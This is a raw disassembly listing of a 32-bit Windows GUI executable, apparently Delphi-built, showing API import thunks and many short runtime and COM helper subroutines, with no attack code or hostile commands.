jmp [ __import_lookup_table_9(user32:SetMenuItemInfoA) ]
SetParent
jmp [ SetParent@IAT ]
SetScrollInfo
jmp [ SetScrollInfo@IAT ]
SetScrollPos
jmp [ SetScrollPos@IAT ]
SetScrollRange
jmp [ SetScrollRange@IAT ]
SetTimer
jmp [ SetTimer@IAT ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowTextA
jmp [ SetWindowTextA@IAT ]
SetWindowsHookExA
jmp [ SetWindowsHookExA@IAT ]
ShowCursor
jmp [ __import_lookup_table_9(user32:ShowCursor) ]
ShowOwnedPopups
jmp [ ShowOwnedPopups@IAT ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ UnhookWindowsHookEx@IAT ]
UnregisterClassA
jmp [ __import_lookup_table_9(user32:UnregisterClassA) ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ __import_lookup_table_9(user32:WaitMessage) ]
WinHelpA
jmp [ __import_lookup_table_9(user32:WinHelpA) ]
WindowFromPoint
jmp [ __import_lookup_table_9(user32:WindowFromPoint) ]
sub_406c38
shr eax 0x10
retn
sub_406c3c
call GetTickCount
retn
sub_406c44
xchg edx eax
call sub_402968
retn
sub_406c4c
xor eax eax
retn
sub_406c50
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406c60
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406c7c
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_406c90
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406cc8
call sub_406c2c
retn
CreateWindowExA
jmp [ __import_lookup_table_9(user32:CreateWindowExA) ]
sub_406ea5
jmp sub_403980
sub_406eac
pop ebp
retn
sub_406eb0
sub [ rw-data ] 0x1
retn
sub_406edd
jmp sub_403980
sub_406ee4
pop ebp
retn
sub_406ee8
sub [ rw-data ] 0x1
retn
sub_407205
jmp sub_403980
sub_40720c
pop ebp
retn
sub_407210
sub [ rw-data ] 0x1
retn
sub_407cdd
add eax 0xffffffd4
jmp sub_40d4d0
sub_407ce5
add eax 0xffffffd4
jmp sub_40d378
sub_407ced
add eax 0xffffffd4
jmp sub_40d414
sub_407cf5
add [ esp + 0x4 ] 0xffffffd4
jmp sub_40594c
sub_407cff
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405974
sub_407d09
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405988
sub_407de0
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
pop ebx
retn
sub_408084
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_40804c
test eax eax
sete al
pop esi
pop ebx
retn
sub_408602
jmp sub_403980
sub_408609
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_408610
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_40859c
pop esi
pop ebx
retn
sub_4086a0
call sub_40867c
retn
sub_408738
push eax
call CloseHandle
retn
sub_4087a8
push ebx
mov ebx eax
mov eax ebx
call sub_408740
inc eax
setne al
pop ebx
retn
sub_408980
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_408994
push esi
mov esi eax
xchg edx eax
call sub_402968
mov eax esi
pop esi
retn
sub_408b80
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_404174
pop esi
pop ebx
retn
sub_408b94
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_40276c
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_408ba8
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408be0
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_40278c
sub_408c48
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_4028c8
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_408c6c
push ebx
mov ebx eax
mov eax ebx
call sub_403f7c
pop ebx
retn
sub_408fcf
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_403f7c
pop eax
pop ebx
retn
sub_409287
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_4093e2
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_40973f
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_40973f
sub_4097fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40443c
mov edx esi
xor ecx ecx
call sub_409688
pop esi
pop ebx
retn
sub_409870
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40443c
mov edx esi
mov cl 0x1
call sub_409688
pop esi
pop ebx
retn
sub_40a0ae
jmp sub_403980
sub_40a0b5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a1a6
jmp sub_403980
sub_40a1ad
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a951
jmp sub_403980
sub_40a958
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a9f8
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a984
pop ebp
retn 0x8
sub_40ab3d
jmp sub_403980
sub_40ab44
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40afe7
jmp sub_403980
sub_40afee
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b507
jmp sub_403980
sub_40b50e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b5b9
jmp sub_403980
sub_40b5c0
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b663
jmp sub_403980
sub_40b66a
pop esi
pop ecx
pop ebp
retn
sub_40b846
jmp sub_403980
sub_40b84d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b8a4
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40bb00
mov eax [ rw-data ]
call sub_4039b8
retn
sub_40bba2
jmp sub_403980
sub_40bc70
jmp sub_403980
sub_40bce0
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_4031a0
sub_40bddc
pop ebx
retn
sub_40be7c
jmp sub_403980
sub_40be83
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40be8c
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_4039b8
sub_40be99
retn
sub_40be9c
push ebp
mov ebp esp
call sub_40bde0
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40be8c
pop ebp
retn 0x4
sub_40beb8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
retn
sub_40bf50
push ebx
mov ebx eax
mov eax ebx
call sub_40bed0
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40c123
jmp sub_403980
sub_40c12a
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c1ef
jmp sub_403980
sub_40c1f6
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c200
call sub_40ba38
mov eax 0x1
call sub_403f64
sub_40c384
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40c45d
jmp sub_403980
sub_40c47a
jmp sub_403980
sub_40c481
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40c52c
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40c490
mov ecx eax
sub_40c718
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c738
push eax
call CharNextA
retn
sub_40ca60
jmp sub_403980
sub_40ca67
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40cad0
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40cf27
jmp sub_403980
sub_40cf2e
pop ebx
mov esp ebp
pop ebp
retn
Sleep
jmp [ __import_lookup_table_10(kernel32:Sleep) ]
sub_40d06c
jmp sub_403980
sub_40d073
pop ebx
mov esp ebp
pop ebp
retn
sub_40d078
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40cfdc
sub_40d088
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40d0a4
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_40278c
pop ebx
retn
sub_40d12c
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40d138
xchg [ eax ] edx
mov eax edx
retn
sub_40d198
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40d228
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40d340
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40d368
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d5e3
jmp sub_403980
sub_40d5ea
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d658
jmp sub_403980
sub_40d65f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d67d
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d676
jmp sub_403980
sub_40d67d
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40db40
jmp sub_403980
sub_40db47
pop ebp
retn
VariantChangeType
jmp [ __import_lookup_table_11(oleaut32:VariantChangeType) ]
sub_40dbc0
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40dc26
jmp sub_403980
sub_40dc2d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dc92
jmp sub_403980
sub_40dc99
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dcfe
jmp sub_403980
sub_40dd05
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dd6a
jmp sub_403980
sub_40dd71
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40ddd6
jmp sub_403980
sub_40dddd
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40de55
jmp sub_403980
sub_40de5c
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40dec8
jmp sub_403980
sub_40decf
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40df38
jmp sub_403980
sub_40df3f
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40dfac
jmp sub_403980
sub_40dfb3
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ SafeArrayCreate@IAT ]
SafeArrayGetLBound
jmp [ SafeArrayGetLBound@IAT ]
SafeArrayGetUBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetUBound) ]
sub_40e339
jmp sub_403980
sub_40e340
pop ebp
retn
sub_40e344
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40e008
sub_40e355
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e9de
jmp sub_403980
sub_40e9e5
pop ecx
pop ebp
retn
sub_40ea77
jmp sub_403980
sub_40ea7e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40eace
jmp sub_403980
sub_40ead5
pop ecx
pop ebp
retn
sub_40eb22
jmp sub_403980
sub_40eb29
pop ecx
pop ebp
retn
sub_40ebbb
jmp sub_403980
sub_40ebc2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ec12
jmp sub_403980
sub_40ec19
pop ecx
pop ebp
retn
sub_40ee61
jmp sub_403980
sub_40ee68
pop ebx
mov esp ebp
pop ebp
retn
sub_40ef7e
jmp sub_403980
sub_40ef85
pop ecx
pop ebp
retn
sub_40ef88
push ebx
mov ebx eax
mov eax ebx
call sub_40f220
mov [ ebx ] 0x1
pop ebx
retn
sub_40f234
push eax
call sub_40f220
pop eax
retn
sub_40f494
call sub_40f548
retn
sub_40f5e8
jmp sub_403980
sub_40f5ef
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f636
jmp sub_403980
sub_40f63d
pop ebx
pop ecx
pop ebp
retn
sub_40f682
jmp sub_403980
sub_40f689
pop ebx
pop ecx
pop ebp
retn
sub_40f6ce
jmp sub_403980
sub_40f6d5
pop ebx
pop ecx
pop ebp
retn
sub_40f71a
jmp sub_403980
sub_40f721
pop ebx
pop ecx
pop ebp
retn
sub_40fae3
jmp sub_403980
sub_40faea
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40fb84
jmp sub_403980
sub_40fb8b
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40fff9
jmp sub_4036cc
sub_4100b4
jmp sub_4036cc
sub_41015b
jmp sub_4036cc
sub_410254
jmp sub_4036cc
sub_41032d
jmp sub_4036cc
sub_410415
jmp sub_4036cc
sub_4105d2
jmp sub_403980
sub_4105d9
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41063b
jmp sub_403980
sub_410642
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410aa8
jmp sub_4036cc
sub_410b97
jmp sub_403980
sub_410b9e
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410c3c
jmp sub_403980
sub_410c43
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410fe0
call sub_410c98
neg al
sbb eax eax
neg eax
retn
sub_4110a1
jmp sub_403980
sub_4110a8
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411151
jmp sub_403980
sub_411158
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4116a9
jmp sub_4036cc
sub_4117b0
jmp sub_403980
sub_4117b7
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4118c1
jmp sub_403980
sub_4118c8
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411d18
jmp sub_403980
sub_411d1f
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411e29
jmp sub_403980
sub_411e30
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_412376
jmp sub_403980
sub_41237d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412421
jmp sub_403980
sub_412428
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41244a
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404674
retn
sub_412443
jmp sub_403980
sub_41244a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4124a6
jmp sub_403980
sub_4124ad
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412529
jmp sub_403980
sub_412686
sub_412a6f
jmp sub_403980
sub_412a76
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412b09
jmp sub_403980
sub_412b10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412b2d
lea eax [ ebp - 0x14 ]
call sub_40465c
retn
sub_412b26
jmp sub_403980
sub_412b2d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412b8a
jmp sub_403980
sub_412b91
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412c33
jmp sub_403980
sub_412c50
jmp sub_403980
sub_412c57
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4131b2
jmp sub_403980
sub_4131b9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41322a
jmp sub_403980
sub_413231
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4135bc
push eax
call sub_40f220
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_4135d0
push eax
call sub_40f220
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_4136e3
jmp sub_403980
sub_4136ea
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413746
jmp sub_403980
sub_41374d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413754
call sub_41375c
retn
sub_413967
jmp sub_403980
sub_413993
jmp sub_403980
sub_41399a
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413bc7
jmp sub_403980
sub_413bce
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_413e6f
jmp sub_403980
sub_413efd
jmp sub_403980
sub_413fed
jmp sub_403980
sub_41408f
jmp sub_403980
sub_414145
jmp sub_403980
sub_4141ec
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40f548
add esp 0x10
sub_414496
jmp sub_403980
sub_41449d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4144e0
mov ax [ eax ]
retn
sub_4145e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40f220
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_4145f8
mov edx 0x80020004
call sub_4145e0
retn
sub_414648
mov dl 0x1
call sub_414650
retn
sub_4146fd
jmp sub_403980
sub_414704
pop esi
pop ebx
pop ebp
retn
sub_414708
push ebp
mov ebp esp
call sub_4148c8
pop ebp
retn 0x4
sub_414794
push ebp
mov ebp esp
call sub_4148c8
pop ebp
retn 0x4
sub_414877
jmp sub_403980
sub_41487e
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4031dc
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035a0
sub_4148a0
xor eax eax
retn
sub_4148a4
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4148b8
mov [ ecx ] 0x8
mov al 0x1
retn
sub_4148c0
call sub_40e994
retn
sub_4148c8
call sub_40ea84
retn
sub_4148d0
call sub_40ef34
retn
sub_4148d8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4148ec
call sub_4148c8
retn
sub_4148f4
push ebp
mov ebp esp
call sub_4148d0
pop ebp
retn 0x8
sub_41490c
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_4149e8
jmp sub_403980
sub_414ab1
jmp sub_403980
sub_414ab8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414ad5
lea eax [ ebp - 0x10 ]
call sub_403f7c
retn
sub_414ace
jmp sub_403980
sub_414ad5
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414ae0
call sub_40ef88
retn
sub_414ae8
mov ecx 0xe
call sub_414184
cmp al 0x1
retn
sub_414b67
jmp sub_403980
sub_414b6e
pop ebp
retn
sub_414c11
jmp sub_403980
sub_414c18
pop ebp
retn
sub_414d31
jmp sub_403980
sub_414d38
pop ebp
retn
sub_414d3c
sub [ rw-data ] 0x1
retn
sub_414e3a
jmp sub_403980
sub_414e41
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_415160
push ebx
add esp 0xffffff00
mov ebx ecx
push 0xff
lea ecx [ esp + 0x4 ]
call sub_4150c8
mov eax ebx
mov edx esp
call sub_4041e0
add esp 0x100
pop ebx
retn
sub_4151bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_403fd0
pop esi
pop ebx
retn
sub_415298
jmp sub_403980
sub_41529f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4152f0
jmp sub_403980
sub_4152f7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_415444
jmp sub_403980
sub_41544b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41551a
jmp sub_403980
sub_415521
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415838
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40f548
pop esi
pop ebx
retn
sub_415ae2
jmp sub_403980
sub_415ae9
pop ebp
retn
sub_415aec
sub [ rw-data ] 0x1
retn
IsEqualGUID
jmp [ __import_lookup_table_12(ole32:IsEqualGUID) ]
CoInitialize
jmp [ __import_lookup_table_12(ole32:CoInitialize) ]
CoUninitialize
jmp [ __import_lookup_table_12(ole32:CoUninitialize) ]
CoGetClassObject
jmp [ __import_lookup_table_12(ole32:CoGetClassObject) ]
CoCreateInstance
jmp [ CoCreateInstance@IAT ]
StringFromCLSID
jmp [ StringFromCLSID@IAT ]
ProgIDFromCLSID
jmp [ __import_lookup_table_12(ole32:ProgIDFromCLSID) ]
CoTaskMemAlloc
jmp [ __import_lookup_table_12(ole32:CoTaskMemAlloc) ]
CoTaskMemFree
jmp [ CoTaskMemFree@IAT ]
OleSetMenuDescriptor
jmp [ __import_lookup_table_12(ole32:OleSetMenuDescriptor) ]
OleDraw
jmp [ __import_lookup_table_12(ole32:OleDraw) ]
IsAccelerator
jmp [ IsAccelerator@IAT ]
CreateStreamOnHGlobal
jmp [ __import_lookup_table_12(ole32:CreateStreamOnHGlobal) ]
SysFreeString
jmp [ __import_lookup_table_13(oleaut32:SysFreeString) ]
GetErrorInfo
jmp [ __import_lookup_table_13(oleaut32:GetErrorInfo) ]
sub_415e21
jmp sub_403980
sub_415e28
pop ebp
retn
sub_415e2c
sub [ rw-data ] 0x1
retn
sub_41672f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4195cc
sub_416739
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4195ec
sub_41775c
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_4177d0
push ecx
mov [ esp ] eax
cmp [ esp ] 0xffff
jne r-xdata
xor eax eax
pop edx
retn
cmp [ esp + 0x2 ] 0xffff
je r-xdata
mov al 0x1
pop edx
retn
sub_41789c
mov eax [ eax + 0xc ]
call sub_418c68
retn
sub_417b73
jmp sub_403980
sub_417b7a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417b80
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_418e20
test eax eax
setge al
pop esi
pop ebx
retn
sub_417e83
jmp sub_403980
sub_417e8a
mov esp ebp
pop ebp
retn
sub_417f58
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_417f64
push ebx
mov ebx edx
mov edx ebx
call sub_417d78
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_417ad8
sub_418010
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41816b
jmp sub_403980
sub_41823f
jmp sub_403980
sub_418250
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_4182bc
jmp sub_403980
sub_4182c3
pop ebx
mov esp ebp
pop ebp
retn
sub_41830e
jmp sub_403980
sub_418315
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_4183a1
jmp sub_403980
sub_4183a8
pop ebx
pop ebp
retn
sub_4183ee
jmp sub_403980
sub_4183f5
pop ebx
pop ebp
retn
sub_41843a
jmp sub_403980
sub_418441
pop ebx
pop ebp
retn
sub_41848b
jmp sub_403980
sub_418492
pop esi
pop ebx
pop ebp
retn
sub_4184e6
jmp sub_403980
sub_4184ed
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_41861a
jmp sub_403980
sub_418696
jmp sub_403980
sub_41876c
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_418f60
sub_41885c
jmp sub_403980
sub_4189e6
jmp sub_403980
sub_4189ed
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418a87
jmp sub_403980
sub_418a8e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418aad
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_418aa6
jmp sub_403980
sub_418aad
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_418b19
jmp sub_403980
sub_418b20
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418c18
jmp sub_403980
sub_418c1f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4031ec
retn
sub_418c35
jmp sub_403980
sub_418c9c
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_418fbc
xor edx edx
mov eax ebx
call sub_418f80
pop ebx
retn
sub_418d14
mov eax [ ebp + 0x4 ]
retn
sub_418d4a
pop ecx
pop edx
pop esi
pop ebx
retn
sub_418d98
jmp sub_403980
sub_418d9f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418da4
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_418dbc
xor edx edx
call sub_418dc4
retn
sub_418eac
mov edx [ eax + 0x8 ]
dec edx
call sub_418dc4
retn
sub_41902c
retn
sub_4190e6
jmp sub_403980
sub_4190ed
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035a0
sub_41917c
jmp sub_403980
sub_419183
pop ebx
pop ecx
pop ebp
retn
sub_419188
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_4191df
jmp sub_403980
sub_4191e6
pop ebx
pop ecx
pop ebp
retn
sub_4191ec
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_419228
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
retn
sub_419240
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_41931b
retn
sub_41931c
cmp edx [ eax + 0x4 ]
jae sub_419228
mov eax [ eax + 0x8 ]
bt [ eax ] edx
sbb eax eax
and eax 0x1
retn
sub_4193d8
test edx edx
je r-xdata
xor edx edx
call sub_4193ec
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_4194a2
jmp sub_403980
sub_4194a9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4194c4
retn
sub_41955d
jmp sub_403980
sub_419564
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4195ba
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
sub_419721
jmp sub_403980
sub_419728
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419891
jmp sub_403980
sub_419898
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4198dc
xor edx edx
call sub_419798
retn
sub_419a4a
jmp sub_403980
sub_419a64
inc [ eax + 0xc ]
retn
sub_419a68
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_419ad2
jmp sub_403980
sub_419ae0
dec [ eax + 0xc ]
call sub_419a68
retn
sub_419aec
xor eax eax
retn
sub_419af0
push ebx
mov ebx ecx
mov eax ebx
call sub_403f7c
pop ebx
retn
sub_419be6
jmp sub_403980
sub_419bed
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419cfd
jmp sub_403980
sub_419df4
retn
sub_419df8
retn
sub_419e38
retn
sub_419e3c
